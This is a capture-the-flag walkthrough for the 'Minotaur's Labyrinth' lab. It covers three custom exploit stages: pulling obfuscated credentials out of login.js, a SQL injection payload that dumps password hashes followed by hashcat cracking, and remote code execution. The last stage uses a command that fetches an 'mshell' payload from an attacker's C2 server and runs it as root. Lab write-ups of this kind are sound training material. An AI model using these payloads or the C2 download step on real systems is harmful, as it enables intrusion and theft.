# Minotaur's Labyrinth: Walkthrough

## Custom Exploit Tools

### Stage 1: Password Grabber

To access the restricted area of the website, the user must pass a credential check. After manually enumerating the website and following referenced custom scripts, it is obvious that the `login.js` script referenced in the `login.html` source contains obfuscated credentials of a user `Daedalus`. The credentials are hidden in the comments of the script and are disguised as a string built by array indicies. 

```javascript
function pwdgen() {
    a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
    b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
    c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
}
//pwd gen for Daedalus a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8]
// 
```

The [golang program](stage1.go) in this repository:

> 1. reaches out to the target and pulls down the `login.js` file
> 2. searches for the password arrays (`a`, `b`, `c`)
> 3. searches for Daedalus' password array in the comments
> 4. uses the reference arrays to build Daedalus' password
> 5. displays the extracted credentials to the user

The attacker can then use these credentials to either login to the site and proceed with the attack, or pass the credentials into another tool to automate the takeover of the target.

### Stage 2: SQLi Injector

To leverage the credentials obtained in the first attack a tool was written in Python3. This tool extracts users and password hashes from the database using a SQLi vulnerability present in the dashboard of an authenticated user. 

After the user authenticates, they are brought to a dashboard where they can search for people and creatures. This search form reaches out and contacts `api/<creatures/people>/search` and has a SQL injection (SQLi) vulnerability present. If an attacker inputs the search string `' OR 1=1;--` they will get a dump of all the creatures or people in the database. This also displays the creatures' and people's password hashes.

After this script is run the attacker must manually crack the hashes using a tool like hashcat, john, or [crackstation](https://crackstation.net).

Hashcat Command:

```bash
hashcat -m 0 -a 0 <hash_file> <wordlist>
```

*The password can be found in the rockyou wordlist.*

Command To Execute Stage 2:

```bash
./exploit.py $TARGET daedalus <password> stage2 -a
```

*Note
The [script](exploit.py) for stage 2 is alsoused to execute stage 3, becuase stage 3 uses some of the same process as stage 2.*

### Stage 3: Foothold

After the attacker authentictes and pulls down the user hashes, they will find that M!n0taur has an easily crackable password hash. This leaks M!n0taur's credentials and allows the attacker to login as M!n0taur (an admin). Once logged in as admin, there is both a web flag and a new page accessible. This new page allows the attacker to run the `echo` command on the target machine and opens up the target to RCE.

Command To Execute Stage 3:

```bash
./exploit.py $TARGET M\!n0taur <password> stage3 -c <C2IP>:<C2PORT> -b
```

If desired, the user can also specify `-s` to specify the name of the script the exploit will pull down from the C2 server. The default script name is `rooter.sh`.

*Note The `-b` option builds a pre-witten script that will pull down a file called `mshell` from the attacker's C2 server and uses the privilege escalation vector to have it run as root.*